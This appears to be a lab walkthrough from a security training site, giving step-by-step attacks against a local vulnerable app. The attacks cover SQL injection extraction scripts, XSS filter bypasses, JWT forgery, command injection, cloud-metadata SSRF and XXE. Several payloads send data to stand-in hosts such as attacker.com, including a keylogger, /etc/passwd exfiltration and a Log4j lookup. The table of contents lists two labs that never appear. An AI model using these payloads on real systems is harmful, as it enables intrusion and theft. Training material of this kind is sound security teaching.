# Zeroday Academy - Intermediate Labs Walkthrough

**Advanced exploitation techniques for experienced penetration testers**

---

## Table of Contents

1. [Blind SQL Injection (Advanced)](#1-blind-sql-injection-advanced)
2. [Stored XSS with Filter Bypass](#2-stored-xss-with-filter-bypass)
3. [Advanced Authentication Bypass](#3-advanced-authentication-bypass)
4. [Command Injection with Filter Evasion](#4-command-injection-with-filter-evasion)
5. [Advanced Data Exposure Techniques](#5-advanced-data-exposure-techniques)
6. [XXE with Out-of-Band Exploitation](#6-xxe-with-out-of-band-exploitation)
7. [Complex Access Control Bypass](#7-complex-access-control-bypass)
8. [Advanced Security Misconfiguration](#8-advanced-security-misconfiguration)
9. [Advanced Deserialization Attacks](#9-advanced-deserialization-attacks)

---

## 1. Blind SQL Injection (Advanced)

### Vulnerability Description
Advanced blind SQL injection techniques including boolean-based, time-based, and error-based extraction methods. This lab simulates real-world scenarios where direct output is not available.

### Impact
- Complete database enumeration without visible output
- Automated data extraction through scripted attacks
- Bypassing advanced filtering mechanisms
- Privilege escalation through stored procedures

### Advanced Solution Steps

#### Step 1: Boolean-Based Blind SQL Injection
**Objective:** Extract data using conditional true/false responses

**Using curl with automated character extraction:**
```bash
#!/bin/bash
# Script to extract admin password character by character
password=""
for i in {1..20}; do
  for ascii in {32..126}; do
    response=$(curl -s "http://localhost:5000/api/vuln/sqli-advanced?id=1' AND ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),$i,1))=$ascii--")
    if [[ $response == *"TRUE"* ]]; then
      char=$(printf "\\$(printf '%03o' $ascii)")
      password+=$char
      echo "Character $i: $char (Password so far: $password)"
      break
    fi
  done
done
```

**Using Burp Suite with Intruder:**
1. Send request to Intruder
2. Set payload position: `1' AND ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),§1§,1))>§65§--`
3. Configure two payload sets:
   - Position 1: Numbers 1-50 (character position)
   - Position 2: Numbers 32-126 (ASCII values)
4. Set attack type to "Cluster Bomb"
5. Use grep matching to identify successful extractions

#### Step 2: Time-Based Blind SQL Injection
**Objective:** Use time delays for data extraction

**Using curl with timing analysis:**
```bash
#!/bin/bash
# Time-based extraction with automated timing
for i in {1..20}; do
  for ascii in {32..126}; do
    start_time=$(date +%s.%N)
    curl -s "http://localhost:5000/api/vuln/sqli-advanced?username=admin'; IF(ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),$i,1))=$ascii,SLEEP(3),SLEEP(0))--"
    end_time=$(date +%s.%N)
    duration=$(echo "$end_time - $start_time" | bc)
    
    if (( $(echo "$duration > 2.5" | bc -l) )); then
      char=$(printf "\\$(printf '%03o' $ascii)")
      echo "Character $i: $char"
      break
    fi
  done
done
```

**Using Burp Suite with response timing:**
1. Send to Intruder with payload: `admin'; IF(ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),§1§,1))=§65§,SLEEP(5),SLEEP(0))--`
2. Configure Cluster Bomb attack with position and ASCII values
3. Sort results by "Response received" timing
4. Identify responses with 5+ second delays

#### Step 3: Error-Based SQL Injection
**Objective:** Extract data through SQL error messages

**Using curl with error extraction:**
```bash
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--"
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1)--"
```

**Advanced error-based techniques:**
```bash
# Double query error injection
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT CONCAT(0x7e,password,0x7e) FROM users)x GROUP BY x HAVING COUNT(*)>1)--"

# BIGINT overflow error injection
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,password,0x7e) FROM users LIMIT 1)x))--"
```

### Advanced Prevention Measures
1. Implement query result randomization
2. Use database query firewalls
3. Implement sophisticated input validation with context-aware filtering
4. Use database activity monitoring (DAM)
5. Implement query execution time limits

---

## 2. Stored XSS with Filter Bypass

### Vulnerability Description
Advanced cross-site scripting attacks that persist in the application database and employ sophisticated filter evasion techniques.

### Impact
- Persistent payload execution for all users
- Advanced social engineering attacks
- Cryptocurrency mining injection
- Advanced phishing campaigns

### Advanced Solution Steps

#### Step 1: Identify Storage Mechanisms
**Objective:** Find where user input gets permanently stored

**Using curl to test comment storage:**
```bash
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(1)</script>","name":"tester"}'
```

**Using Burp Suite:**
1. Intercept POST requests to comment/profile endpoints
2. Modify JSON/form data with test payloads
3. Use Repeater to test various input fields
4. Check if payloads persist across page reloads

#### Step 2: Advanced Filter Bypass Techniques
**Objective:** Evade sophisticated XSS filters and WAFs

**Using curl with advanced payloads:**
```bash
# WAF bypass techniques
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'

# Filter bypass with encoding
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'

# DOM clobbering
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<form id=test><input name=action><input name=method></form><script>test.action="javascript:alert(1)"</script>'
```

**Advanced Burp Suite techniques:**
1. Use Burp's "Hackvertor" extension for encoding bypasses
2. Configure custom payload processors in Intruder
3. Use Collaborator for out-of-band XSS detection

#### Step 3: Advanced Payload Development
**Objective:** Create sophisticated attack payloads

**Using curl with advanced payloads:**
```bash
# Keylogger injection
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<script>document.addEventListener("keydown",function(e){fetch("http://attacker.com/log?key="+e.key)})</script>'

# Cryptocurrency miner injection
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner=new CoinHive.Anonymous("YOUR_SITE_KEY");miner.start();</script>'

# Advanced session hijacking
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<script>fetch("/admin/users",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("http://attacker.com/exfil?data="+btoa(d)))</script>'
```

### Advanced Prevention Measures
1. Implement context-aware output encoding
2. Use Content Security Policy (CSP) with nonces and strict-dynamic
3. Implement DOM-based XSS protection
4. Use input validation with machine learning-based detection
5. Implement real-time XSS attack monitoring

---

## 3. Advanced Authentication Bypass

### Vulnerability Description
Complex authentication bypass techniques including JWT manipulation, session fixation, and race condition exploitation.

### Impact
- Complete authentication system compromise
- Privilege escalation through token manipulation
- Race condition exploitation for temporary access
- Advanced session hijacking techniques

### Advanced Solution Steps

#### Step 1: JWT Token Manipulation
**Objective:** Exploit JSON Web Token vulnerabilities

**Using curl for JWT attacks:**
```bash
# None algorithm attack
curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9."

# Algorithm confusion attack (RS256 to HS256)
curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.SIGNATURE_USING_PUBLIC_KEY_AS_HMAC_SECRET"

# Weak secret brute force
curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -H "Authorization: Bearer $(echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9' | openssl dgst -sha256 -hmac 'secret' -binary | base64 | tr -d '\n')"
```

**Using Burp Suite JWT Editor:**
1. Install JWT Editor extension
2. Intercept authentication requests
3. Modify JWT claims in the extension
4. Test algorithm confusion attacks
5. Brute force weak signing secrets

#### Step 2: Session Race Condition Exploitation
**Objective:** Exploit timing vulnerabilities in authentication

**Using curl with parallel requests:**
```bash
#!/bin/bash
# Race condition attack on session validation
for i in {1..100}; do
  curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
    -d "username=admin&password=wrong&exploit=race" &
done
wait
```

**Advanced race condition with Burp Suite:**
1. Send authentication request to Intruder
2. Set attack type to "Null payloads"
3. Configure high thread count (50-100)
4. Use "Resource Pool" to control timing
5. Analyze responses for timing-based vulnerabilities

#### Step 3: Advanced Session Manipulation
**Objective:** Exploit session management vulnerabilities

**Using curl for session attacks:**
```bash
# Session fixation
curl -c cookies.txt "http://localhost:5000/api/vuln/auth-advanced?JSESSIONID=ATTACKER_CONTROLLED_SESSION"
curl -b cookies.txt -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -d "username=victim&password=password"

# Session prediction
for i in {1000..1100}; do
  curl -b "sessionid=$i" "http://localhost:5000/api/vuln/auth-advanced/profile"
done
```

### Advanced Prevention Measures
1. Implement secure JWT handling with proper algorithm validation
2. Use cryptographically secure session identifiers
3. Implement proper session timeout and invalidation
4. Use synchronization tokens for critical operations
5. Implement advanced anomaly detection for authentication patterns

---

## 4. Command Injection with Filter Evasion

### Vulnerability Description
Advanced command injection techniques that bypass input filters, WAFs, and sandboxing mechanisms.

### Impact
- Complete system compromise through filter evasion
- Advanced persistent backdoor installation
- Container escape techniques
- Advanced data exfiltration methods

### Advanced Solution Steps

#### Step 1: Filter Bypass Techniques
**Objective:** Evade command injection filters

**Using curl with evasion techniques:**
```bash
# Concatenation bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;w'h'o'a'm'i"

# Variable substitution bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;\$0 -c whoami"

# Encoding bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;\$(echo d2hvYW1p | base64 -d)"

# Wildcard bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;/bin/c?t /etc/p?sswd"
```

#### Step 2: Advanced Data Exfiltration
**Objective:** Extract sensitive data through various channels

**Using curl for DNS exfiltration:**
```bash
# DNS exfiltration
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;nslookup \$(whoami).attacker.com"

# HTTP exfiltration with base64
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;curl -X POST http://attacker.com/exfil -d \"\$(cat /etc/passwd | base64 -w 0)\""

# ICMP exfiltration
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;ping -c 1 -p \$(echo \$(whoami) | xxd -p) attacker.com"
```

#### Step 3: Container Escape Techniques
**Objective:** Escape containerized environments

**Using curl for container escape:**
```bash
# Docker socket abuse
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host"

# Privileged container escape
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;echo 'evil_command' > /host_mount/tmp/backdoor.sh"

# Kubernetes service account abuse
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods --all-namespaces"
```

### Advanced Prevention Measures
1. Implement application sandboxing with seccomp-bpf
2. Use container security frameworks like Falco
3. Implement runtime application self-protection (RASP)
4. Use advanced input validation with ML-based detection
5. Implement network micro-segmentation

---

## 5. Advanced Data Exposure Techniques

### Vulnerability Description
Sophisticated techniques for identifying and exploiting data exposure vulnerabilities in complex applications.

### Impact
- Advanced reconnaissance and information gathering
- Configuration file extraction from distributed systems
- Cloud metadata service exploitation
- Advanced log file analysis and data mining

### Advanced Solution Steps

#### Step 1: Cloud Metadata Exploitation
**Objective:** Extract cloud service credentials and configuration

**Using curl for cloud metadata attacks:**
```bash
# AWS metadata service
curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Azure metadata service
curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://169.254.169.254/metadata/instance/compute?api-version=2019-06-01" \
  -H "Metadata: true"

# Google Cloud metadata
curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

#### Step 2: Advanced Configuration Discovery
**Objective:** Discover sensitive configuration files in distributed systems

**Using curl for distributed system reconnaissance:**
```bash
# Kubernetes API server discovery
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/.well-known/openid_configuration"

# Docker registry API
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/v2/_catalog"

# Elasticsearch cluster info
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/_cluster/health"

# Consul KV store
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/v1/kv/?recurse"
```

#### Step 3: Advanced Log Analysis and Data Mining
**Objective:** Extract sensitive information from application logs

**Using curl for log exploitation:**
```bash
# Log4j exploitation
curl "http://localhost:5000/api/vuln/data-exposure-advanced" \
  -H "User-Agent: \${jndi:ldap://attacker.com/a}"

# Log injection for data extraction
curl "http://localhost:5000/api/vuln/data-exposure-advanced?search=admin' UNION SELECT password FROM users--"

# Debug log exposure
curl "http://localhost:5000/api/vuln/data-exposure-advanced?debug=true&level=ALL"
```

### Advanced Prevention Measures
1. Implement sophisticated access control for metadata services
2. Use secrets management systems like HashiCorp Vault
3. Implement log sanitization and sensitive data detection
4. Use distributed configuration management with encryption
5. Implement advanced monitoring for unusual data access patterns

---

## 6. XXE with Out-of-Band Exploitation

### Vulnerability Description
Advanced XML External Entity attacks using out-of-band techniques for data exfiltration when direct output is not available.

### Impact
- Advanced data exfiltration through DNS/HTTP channels
- Internal network reconnaissance through blind XXE
- Advanced file system enumeration
- Cloud service exploitation through XXE

### Advanced Solution Steps

#### Step 1: Out-of-Band XXE Setup
**Objective:** Establish external communication channel for data exfiltration

**Setting up attack infrastructure:**
```bash
# Setup HTTP server for data collection
python3 -m http.server 8080 &

# Setup DNS server for DNS exfiltration (requires dnslib)
python3 -c "
import socketserver
from dnslib import *

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request[0]
        query = DNSRecord.parse(data)
        print(f'DNS Query: {query.q.qname}')

server = socketserver.UDPServer(('0.0.0.0', 53), DNSHandler)
server.serve_forever()
" &
```

#### Step 2: Advanced XXE Exploitation
**Objective:** Extract data using parameter entities and external DTDs

**Using curl with external DTD:**
```bash
# Create evil.dtd on your server
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_IP:8080/exfil?data=%file;'>">
%eval;
%exfiltrate;
EOF

# Execute XXE attack
curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://YOUR_IP:8080/evil.dtd\"> %xxe;]><root></root>"
```

#### Step 3: Advanced Network Reconnaissance
**Objective:** Use XXE for internal network scanning

**Using curl for network scanning:**
```bash
# Port scanning through XXE
for port in 22 80 443 3306 5432; do
  curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://192.168.1.1:$port\">]><root>&xxe;</root>"
done

# Service enumeration
curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost:6379/\">]><root>&xxe;</root>"
```

### Advanced Prevention Measures
1. Implement XML parsing with secure configurations by default
2. Use XML schema validation with strict whitelisting
3. Implement network-level protections against XXE
4. Use application-level firewalls with XML inspection
5. Implement advanced monitoring for XXE attack patterns

---

## 7. Complex Access Control Bypass

### Vulnerability Description
Advanced access control bypass techniques including IDOR chaining, privilege escalation through parameter pollution, and multi-step authorization bypass.

### Advanced Solution Steps

#### Step 1: IDOR Chain Exploitation
**Objective:** Chain multiple IDOR vulnerabilities for privilege escalation

**Using curl for IDOR chaining:**
```bash
# Step 1: Enumerate user IDs
for id in {1..100}; do
  response=$(curl -s "http://localhost:5000/api/vuln/access-control-advanced?user_id=$id")
  if [[ $response == *"admin"* ]]; then
    echo "Admin user found: ID $id"
    admin_id=$id
    break
  fi
done

# Step 2: Use discovered admin ID to access sensitive functions
curl "http://localhost:5000/api/vuln/access-control-advanced/admin?user_id=$admin_id&action=create_user"
```

### Advanced Prevention Measures
1. Implement sophisticated authorization matrices
2. Use attribute-based access control (ABAC)
3. Implement real-time access pattern analysis
4. Use zero-trust architecture principles
5. Implement advanced session management with context awareness

---

## Advanced Testing Tools and Techniques

### Automated Testing Tools
1. **SQLMap** - Advanced SQL injection automation
2. **XSSStrike** - Advanced XSS detection and exploitation
3. **Commix** - Command injection exploitation
4. **XXEinjector** - Advanced XXE exploitation
5. **Custom Python scripts** - Tailored exploitation tools

### Burp Suite Professional Extensions
1. **JWT Editor** - JSON Web Token manipulation
2. **Collaborator Everywhere** - Out-of-band vulnerability detection
3. **Hackvertor** - Advanced encoding and evasion
4. **Turbo Intruder** - High-speed attack automation
5. **Content Type Converter** - Advanced content manipulation

### Advanced Methodology
1. **Reconnaissance Phase** - Deep application analysis
2. **Vulnerability Chaining** - Combine multiple vulnerabilities
3. **Evasion Techniques** - Bypass modern security controls
4. **Persistence Methods** - Maintain access after exploitation
5. **Data Exfiltration** - Advanced data extraction techniques

---

**Remember:** These advanced techniques require extensive knowledge and should only be used in authorized testing environments. Always ensure proper authorization and follow responsible disclosure practices.